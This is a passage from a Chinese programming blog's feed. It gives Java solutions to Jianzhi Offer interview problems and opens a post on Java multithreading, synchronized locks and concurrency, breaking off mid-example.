in.push(node);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (out.isEmpty())</span><br><span class="line">        <span class="keyword">while</span> (!in.isEmpty())</span><br><span class="line">            out.push(in.pop());</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (out.isEmpty())</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"queue is empty"</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> out.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="位运算">位运算</span></h1><h2><span id="不用加减乘除做加法">不用加减乘除做加法 ×</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">Add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span> ? a : Add(a ^ b, (a &amp; b) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="二进制中1的个数">二进制中1的个数 ×</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">NumberOf1</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="comment">/*</span></span><br><span class="line"><span class="comment">           * 用1和n进行位与运算，</span></span><br><span class="line"><span class="comment">           * 结果要是为1则n的2进制形式</span></span><br><span class="line"><span class="comment">           * 最右边那位肯定是1，否则为0</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">           <span class="keyword">if</span> ((n &amp; <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">               count++;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">//把n的2进制形式往右推一位</span></span><br><span class="line">           n = n &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> count;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="数组中只出现一次的数字">数组中只出现一次的数字 ×</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">FindNumsAppearOnce</span><span class="params">(<span class="keyword">int</span> [] nums,<span class="keyword">int</span> num1[] , <span class="keyword">int</span> num2[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> diff = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> num : nums)</span><br><span class="line">    diff ^= num;</span><br><span class="line">diff &amp;= -diff;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((num &amp; diff) == <span class="number">0</span>)</span><br><span class="line">         num1[<span class="number">0</span>] ^= num;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         num2[<span class="number">0</span>] ^= num;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="其他">其他</span></h1><h2><span id="求123n">求1+2+3+…+n ×</span></h2><p>求1+2+3+…+n，要求不能使用乘除法、for、while、if、else、switch、case等关键字及条件判断语句（A?B:C）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">Sum_Solution</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = n;</span><br><span class="line">        <span class="keyword">boolean</span> ans = (n&gt;<span class="number">0</span>)&amp;&amp;((sum+=Sum_Solution(n-<span class="number">1</span>))&gt;<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="数据流的中位数-">数据流的中位数 -</span></h2><p>如何得到一个数据流中的中位数？如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。如果从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值。我们使用Insert()方法读取数据流，使用GetMedian()方法获取当前读取数据的中位数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    PriorityQueue&lt;Integer&gt; left=<span class="keyword">new</span> PriorityQueue&lt;&gt;((o1,o2) -&gt;o2 - o1);</span><br><span class="line">    PriorityQueue&lt;Integer&gt; right=<span class="keyword">new</span> PriorityQueue&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> N=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Insert</span><span class="params">(Integer num)</span> </span>&#123;</span><br><span class="line">        N++;</span><br><span class="line">        <span class="keyword">if</span>(N%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            right.add(num);</span><br><span class="line">            left.add(right.poll());</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            left.add(num);</span><br><span class="line">            right.add(left.poll());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Double <span class="title">GetMedian</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(N%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> (right.peek()+left.peek())/<span class="number">2.0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">double</span>)left.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="滑动窗口的最大值-">滑动窗口的最大值 -</span></h2><p>给定一个数组和滑动窗口的大小，找出所有滑动窗口里数值的最大值。例如，如果输入数组{2,3,4,2,6,2,5,1}及滑动窗口的大小3，那么一共存在6个滑动窗口，他们的最大值分别为{4,4,6,6,6,5}； 针对数组{2,3,4,2,6,2,5,1}的滑动窗口有以下6个： {[2,3,4],2,6,2,5,1}， {2,[3,4,2],6,2,5,1}， {2,3,[4,2,6],2,5,1}， {2,3,4,[2,6,2],5,1}， {2,3,4,2,[6,2,5],1}， {2,3,4,2,6,[2,5,1]}。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">maxInWindows</span><span class="params">(<span class="keyword">int</span>[] num, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; ret = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (size &gt; num.length || size &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    PriorityQueue&lt;Integer&gt; heap = <span class="keyword">new</span> PriorityQueue&lt;&gt;((o1, o2) -&gt; o2 - o1);  <span class="comment">/* 大顶堆 */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        heap.add(num[i]);</span><br><span class="line">    ret.add(heap.peek());</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = i + size; j &lt; num.length; i++, j++) &#123;            <span class="comment">/* 维护一个大小为 size 的大顶堆 */</span></span><br><span class="line">        heap.remove(num[i]);</span><br><span class="line">        heap.add(num[j]);</span><br><span class="line">        ret.add(heap.peek());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="孩子们的游戏">孩子们的游戏 ×</span></h2><p>每年六一儿童节,牛客都会准备一些小礼物去看望孤儿院的小朋友,今年亦是如此。HF作为牛客的资深元老,自然也准备了一些小游戏。其中,有个游戏是这样的:首先,让小朋友们围成一个大圈。然后,他随机指定一个数m,让编号为0的小朋友开始报数。每次喊到m-1的那个小朋友要出列唱首歌,然后可以在礼品箱中任意的挑选礼物,并且不再回到圈中,从他的下一个小朋友开始,继续0…m-1报数….这样下去….直到剩下最后一个小朋友,可以不用表演,并且拿到牛客名贵的“名侦探柯南”典藏版(名额有限哦!!^_^)。请你试着想下,哪个小朋友会得到这份礼品呢？(注：小朋友的编号是从0到n-1)</p><p>如果没有小朋友，请返回-1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">LastRemaining_Solution</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> (m+LastRemaining_Solution(n-<span class="number">1</span>,m))%n;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="数值的整数次方">数值的整数次方 √</span></h2><p>给定一个double类型的浮点数base和int类型的整数exponent。求base的exponent次方。</p><p>保证base和exponent不同时为0</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">Power</span><span class="params">(<span class="keyword">double</span> base, <span class="keyword">int</span> exponent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(exponent==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(exponent==<span class="number">1</span>) <span class="keyword">return</span> base;</span><br><span class="line">        <span class="keyword">if</span>(exponent&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            base=<span class="number">1</span>/base;</span><br><span class="line">            exponent=-exponent;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> exponent%<span class="number">2</span>==<span class="number">0</span>?Power(base*base,exponent/<span class="number">2</span>):base*Power(base*base,exponent/<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2><span id="整数中1出现的次数">整数中1出现的次数 ×</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">NumberOf1Between1AndN_Solution</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ones = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">long</span> m = <span class="number">1</span>; m &lt;= n; m *= <span class="number">10</span>)</span><br><span class="line">        ones += (n/m + <span class="number">8</span>) / <span class="number">10</span> * m + (n/m % <span class="number">10</span> == <span class="number">1</span> ? n%m + <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> ones;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 剑指Offer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程与并发原理</title>
      <link href="/2020/04/06/mt/"/>
      <url>/2020/04/06/mt/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>盘点了常考的Java多线程与并发原理</p><a id="more"></a><!-- toc --><ul><li><a href="#线程安全问题的主要诱因">线程安全问题的主要诱因</a><ul><li><a href="#解决问题的根本方法">解决问题的根本方法</a></li></ul></li><li><a href="#互斥锁">互斥锁</a><ul><li><a href="#互斥锁的特性">互斥锁的特性</a><ul><li><a href="#互斥性">互斥性</a></li><li><a href="#可见性">可见性</a></li></ul></li></ul></li><li><a href="#获取对象">获取对象</a><ul><li><a href="#根据获取的锁的分类获取对象锁和获取类锁">根据获取的锁的分类：获取对象锁和获取类锁</a><ul><li><a href="#获取对象锁的两种用法">获取对象锁的两种用法</a></li><li><a href="#获取类锁的两种用法">获取类锁的两种用法</a></li><li><a href="#对象锁和类锁的总结">对象锁和类锁的总结</a></li></ul></li></ul></li><li><a href="#对象在内存中的布局">对象在内存中的布局</a><ul><li><a href="#对象头的结构">对象头的结构</a></li><li><a href="#mark-word">Mark Word</a></li></ul></li><li><a href="#monitor每个java对象天生自带了一把看不见的锁c实现">Monitor：每个Java对象天生自带了一把看不见的锁（C++实现）</a></li><li><a href="#什么是从重入">什么是从重入</a></li><li><a href="#为什么会对synchronized嗤之以鼻">为什么会对synchronized嗤之以鼻</a></li><li><a href="#java6以后synchronized性能得到了很大的提升">Java6以后，synchronized性能得到了很大的提升</a></li><li><a href="#自旋锁与自适应自旋锁">自旋锁与自适应自旋锁</a><ul><li><a href="#自旋锁">自旋锁</a></li><li><a href="#自适应自旋锁">自适应自旋锁</a></li></ul></li><li><a href="#锁消除">锁消除</a><ul><li><a href="#更彻底的优化">更彻底的优化</a></li></ul></li><li><a href="#锁粗化">锁粗化</a><ul><li><a href="#另一种极端">另一种极端</a></li></ul></li><li><a href="#synchronized的四种状态">Synchronized的四种状态</a><ul><li><a href="#偏向锁减少同一线程获取锁的代价-cascompare-and-swap-">偏向锁：减少同一线程获取锁的代价 CAS（Compare and Swap）【-】</a></li><li><a href="#轻量级锁">轻量级锁</a><ul><li><a href="#加锁过程">加锁过程</a></li><li><a href="#解锁过程">解锁过程</a></li></ul></li></ul></li><li><a href="#锁的内存语义">锁的内存语义</a></li><li><a href="#偏向锁-轻量级锁-重量级锁的汇总">偏向锁、轻量级锁、重量级锁的汇总</a></li><li><a href="#synchronized和reentrantlock">Synchronized和ReentrantLock</a><ul><li><a href="#reentrantlock再入锁">ReentrantLock（再入锁）</a><ul><li><a href="#reentrantlock公平性的设置">ReentrantLock公平性的设置</a></li><li><a href="#reentrantlock将锁对象化">ReentrantLock将锁对象化</a></li><li><a href="#能将waitnotifynotifyall对象化">能将wait\notify\notifyAll对象化</a></li><li><a href="#synchronized和reentrantlock的区别总结">Synchronized和ReentrantLock的区别总结</a></li></ul></li></ul></li><li><a href="#什么是java内存模型中的happens-before">什么是Java内存模型中的happens-before</a><ul><li><a href="#java内存模型jmm">Java内存模型JMM</a></li><li><a href="#jmm中的主内存">JMM中的主内存</a></li><li><a href="#jmm中的工作内存">JMM中的工作内存</a></li><li><a href="#jmm与java内存区域划分是不同的概念层次">JMM与Java内存区域划分是不同的概念层次</a></li><li><a href="#主内存与工作内存的数据存储类型以及操作方式归纳">主内存与工作内存的数据存储类型以及操作方式归纳</a></li><li><a href="#指令重排序需要满足的条件">指令重排序需要满足的条件</a><ul><li><a href="#a操作的结果需要对b操作可见则a与b存在happens-before关系">A操作的结果需要对B操作可见，则A与B存在happens-before关系</a></li><li><a href="#happens-before的八大原则">Happens-before的八大原则</a></li><li><a href="#happens-before的概念">Happens-before的概念</a></li><li><a href="#final重排序">final重排序</a></li><li><a href="#volatilejvm提供的轻量级同步机制">Volatile：JVM提供的轻量级同步机制</a></li><li><a href="#volatile不保证原子性">Volatile不保证原子性</a></li><li><a href="#volatile变量为何立即可见">Volatile变量为何立即可见？</a></li><li><a href="#volatile如何禁止重排优化">Volatile如何禁止重排优化</a></li><li><a href="#实现线程安全的单例写法错误示范">实现线程安全的单例写法（错误示范）</a></li><li><a href="#volatile和synchronized的区别">Volatile和synchronized的区别</a></li></ul></li></ul></li><li><a href="#cascompare-and-swap">CAS（compare and swap）</a><ul><li><a href="#乐观锁和悲观锁">乐观锁和悲观锁</a></li><li><a href="#一种高效实现线程安全性的方法">一种高效实现线程安全性的方法</a></li><li><a href="#cas思想">CAS思想</a></li><li><a href="#cas多数情况下对开发者来说是透明的">CAS多数情况下对开发者来说是透明的</a></li><li><a href="#缺点">缺点</a></li></ul></li><li><a href="#java线程池">Java线程池</a><ul><li><a href="#利用executors创建不同的线程池满足不同场景的需求">利用Executors创建不同的线程池满足不同场景的需求</a></li><li><a href="#forkjoin框架">Fork/Join框架</a></li><li><a href="#为什么要使用线程池">为什么要使用线程池</a></li><li><a href="#executor的框架">Executor的框架</a></li><li><a href="#juc的三个executor接口">J.U.C的三个Executor接口</a></li><li><a href="#threadpoolexecutor的构造函数">ThreadPoolExecutor的构造函数</a></li><li><a href="#threadpooleecutor">ThreadPoolEecutor</a></li><li><a href="#handler线程池的饱和策略">Handler:线程池的饱和策略</a></li><li><a href="#新任务提交execute执行后的判断">新任务提交execute执行后的判断</a></li><li><a href="#线程池的状态">线程池的状态</a></li><li><a href="#工作线程的生命周期">工作线程的生命周期</a></li><li><a href="#线程池的大小如何选定">线程池的大小如何选定</a></li></ul></li></ul><!-- tocstop --><h2><span id="线程安全问题的主要诱因">线程安全问题的主要诱因</span></h2><p>Ø 存在共享数据（也称临界资源）</p><p>Ø 存在多条线程共同操作这些共享数据</p><h3><span id="解决问题的根本方法">解决问题的根本方法</span></h3><p>同一时刻有且只有一个线程在操作共享数据，其他线程必须等到该线程处理完数据后再对共享数据进行操作。</p><h2><span id="互斥锁">互斥锁</span></h2><h3><span id="互斥锁的特性">互斥锁的特性</span></h3><h4><span id="互斥性">互斥性</span></h4><p><font color="red">即在同一时间只允许一个线程持有某个对象锁</font>，通过这种特性来实现多线程的协调机制，这样在同一时间只有一个线程对需要同步的代码块（复合操作）进行访问。互斥性也称为<font color="orange"><strong>操作的原子性。</strong></font></p><h4><span id="可见性">可见性</span></h4><p><font color="red">必须确保在锁被释放之前，对共享变量所做的修改，对于随后获得该锁的另一个线程是可见的</font>（即在获取锁时应获得最新共享变量的值），否则另一个线程可能是在本地缓存的某个副本上继续操作，从而引起不一致。</p><p><font color="orange"><strong>synchronized锁的不是代码，锁的都是对象</strong></font> </p><h2><span id="获取对象">获取对象</span></h2><h3><span id="根据获取的锁的分类获取对象锁和获取类锁">根据获取的锁的分类：获取对象锁和获取类锁</span></h3><h4><span id="获取对象锁的两种用法">获取对象锁的两种用法</span></h4><ol><li><p>同步代码块（synchronized（this），synchronized（类实例对象）），锁是<font color="orange"><strong>小括号（）中的实例对象</strong></font></p></li><li><p>同步非静态方法（synchronized method），锁是<font color="orange"><strong>当前对象的实例对象</strong></font></p></li></ol><h4><span id="获取类锁的两种用法">获取类锁的两种用法</span></h4><ol><li><p>同步代码块（synchronized（类.class）），锁是小括号（）中的类对象（Class对象）。</p></li><li><p>同步静态方法（synchronized static method），锁是当前对象的<font color="red">类对象</font>（Class对象）</p></li></ol><p><img src="image-20200406094616354.png" alt></p><p>锁和获取类锁</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.interview.javabasic.thread;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SyncThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String threadName = Thread.currentThread().getName();</span><br><span class="line">        <span class="keyword">if</span> (threadName.startsWith(<span class="string">"A"</span>)) &#123;</span><br><span class="line">            async();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (threadName.startsWith(<span class="string">"B"</span>)) &#123;</span><br><span class="line">            syncObjectBlock1();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (threadName.startsWith(<span class="string">"C"</span>)) &#123;</span><br><span class="line">            syncObjectMethod1();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (threadName.startsWith(<span class="string">"D"</span>)) &#123;</span><br><span class="line">            syncClassBlock1();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (threadName.startsWith(<span class="string">"E"</span>)) &#123;</span><br><span class="line">            syncClassMethod1();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 异步方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">async</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">"_Async_Start: "</span> + <span class="keyword">new</span> SimpleDateFormat(<span class="string">"HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()));</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">"_Async_End: "</span> + <span class="keyword">new</span> SimpleDateFormat(<span class="string">"HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法中有 synchronized(this|object) &#123;&#125; 同步代码块</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">syncObjectBlock1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">"_SyncObjectBlock1: "</span> + <span class="keyword">new</span> SimpleDateFormat(<span class="string">"HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()));</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">"_SyncObjectBlock1_Start: "</span> + <span class="keyword">new</span> SimpleDateFormat(<span class="string">"HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()));</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">"_SyncObjectBlock1_End: "</span> + <span class="keyword">new</span> SimpleDateFormat(<span class="string">"HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * synchronized 修饰非静态方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">syncObjectMethod1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">"_SyncObjectMethod1: "</span> + <span class="keyword">new</span> SimpleDateFormat(<span class="string">"HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">"_SyncObjectMethod1_Start: "</span> + <span class="keyword">new</span> SimpleDateFormat(<span class="string">"HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()));</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">"_SyncObjectMethod1_End: "</span> + <span class="keyword">new</span> SimpleDateFormat(<span class="string">"HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">syncClassBlock1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">"_SyncClassBlock1: "</span> + <span class="keyword">new</span> SimpleDateFormat(<span class="string">"HH:mm:ss"</span>).format(<span class="keyword">new</span> Date()));</span><br><span class="line">        <span class="keyword">synchronized</span> (SyncThread<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                